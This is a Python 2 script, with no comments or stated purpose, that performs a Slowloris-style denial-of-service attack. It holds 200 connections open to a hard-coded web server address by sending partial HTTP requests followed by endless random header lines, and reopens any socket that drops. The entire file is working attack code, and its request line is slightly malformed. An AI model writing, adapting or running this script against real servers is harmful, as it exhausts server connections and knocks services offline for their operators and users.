import socket
import random
import time

PORT = 32772
ADDRESS = '192.168.99.100'
NUMBER_OF_SOCKETS = 200

def initiate_sockets(n,ip='127.0.0.1',port=80):
    sockets = []
    for _ in range(1,n+1):
        sockets.append(create_socket(ip,port))
    return sockets

def create_socket(ip,port):
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip,port))
    s.send('GET / HTTP/1.0\r\nMozilla/5.0 (Windows NT x.y; rv:10.0) Gecko/20100101 Firefox/10.0\r\n')
    print 'Socket created @ ' + ip + ':' + str(port)
    return s

if __name__ == "__main__":
    socket_list = initiate_sockets(NUMBER_OF_SOCKETS,ADDRESS,PORT)
    while True:
        i = 0
        for s in list(socket_list):
            i += 1
            try:
                s.send('X-L:'+ str(random.randint(97,122)) +'\r\n')
                print 'Sent random char to socket ' + str(i)
            except socket.error:
                socket_list.remove(s)
            for _ in range(NUMBER_OF_SOCKETS-len(socket_list)):
                socket_list.append(create_socket(ADDRESS,PORT))

        print 'Active sockets ' + str(len(socket_list))

        time.sleep(random.randint(1,4))
